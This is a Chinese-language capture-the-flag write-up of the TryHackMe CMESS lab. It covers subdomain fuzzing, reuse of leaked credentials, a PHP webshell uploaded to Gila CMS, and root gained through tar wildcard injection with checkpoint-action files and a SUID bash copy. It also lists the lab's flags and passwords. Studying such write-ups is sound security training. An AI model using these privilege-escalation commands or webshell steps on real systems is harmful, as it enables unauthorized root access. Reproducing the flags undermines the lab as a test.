# THM CMESS 渗透测试 (2026-05-26)

**目标**: 10.48.144.128 - TryHackMe 靶场 (CMESS)
**授权**: THM 授权靶场，全 IP 范围，无限制

## 攻击链

1. **信息搜集**: Nmap 扫描发现 22/80 端口 (SSH/HTTP)
2. **子域名枚举**: ffuf 发现 `dev.cmess.thm`
3. **凭证泄露**: dev 站点开发日志明文泄露 `andre:KPFTN_f2yxe%`
4. **Web 后台**: 登录 Gila CMS 管理面板，上传 webshell
5. **横向移动**: `/opt/.password.bak` 获取 andre 系统密码 `UQfsdCB7aAP6`
6. **提权**: tar 通配符漏洞 (cron `*/2 * * * *`) → SUID bash → root

## 获取的 Flags

| Flag         | 位置                   | 内容                                    |
| ------------ | ---------------------- | --------------------------------------- |
| **user.txt** | `/home/andre/user.txt` | `thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}` |
| **root.txt** | `/root/root.txt`       | `thm{9f85b7fdeb2cf96985bf5761a93546a2}` |

## 关键技术点

### 1. 子域名枚举
```bash
ffuf -u http://cmess.thm -H "Host: FUZZ.cmess.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
```
发现 `dev.cmess.thm`，返回开发日志静态页。

### 2. 开发日志信息泄露
dev.cmess.thm 页面包含明文密码：
- **用户名**: `andre@cmess.thm`
- **密码**: `KPFTN_f2yxe%`
- **上下文**: support 团队为 andre 重置密码后直接写在开发日志中

### 3. Gila CMS 管理后台
使用泄露凭据登录 `http://cmess.thm/admin`
- **CMS 版本**: Gila CMS 1.10.9
- **关键功能**: 文件管理器 (`/admin/fm`) 支持上传文件
- **安全缺陷**: 无 CSRF token 保护

### 4. Webshell 上传
通过文件管理器上传 PHP webshell 到 `/assets/webshell.php`
触发后获取 www-data shell。

### 5. 密码备份文件泄露
```bash
cat /opt/.password.bak
# andres backup password
# UQfsdCB7aAP6
```
使用密码 `su andre` 切换到 andre 用户。

### 6. Tar 通配符提权 (CVE-2018-1000628)
计划任务：
```
*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

利用 tar 的 `--checkpoint` 和 `--checkpoint-action` 参数：
```bash
cd /home/andre/backup
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
cat > shell.sh << 'EOF'
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
EOF
```

等待 cron 执行后：
```bash
/tmp/bash -p
whoami
# root
```

### 7. SUID Bash 提权
tar 以 root 执行 shell.sh，创建 SUID bash：
```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```
执行 `/tmp/bash -p` 获取 root shell。

## 权限提升路径

```
www-data (webshell) → andre (/opt/.password.bak) → root (tar wildcard + SUID bash)
```

## 发现的凭证

| 服务     | 用户名          | 密码         | 来源               |
| -------- | --------------- | ------------ | ------------------ |
| Gila CMS | andre@cmess.thm | KPFTN_f2yxe% | dev 站点开发日志   |
| 系统     | andre           | UQfsdCB7aAP6 | /opt/.password.bak |

## 渗透测试状态文件

- `target.md` — 目标信息
- `findings.md` — 完整发现记录
- `commands.md` — 命令历史
- `attack-path.md` — 攻击路径
- `writeup-cmess-20260526.md` — 本文件

## 靶机状态

- **状态**: ✅ 全部完成
- **获取 Flags**: 2/2 (user.txt + root.txt)
- **总耗时**: ~60 分钟
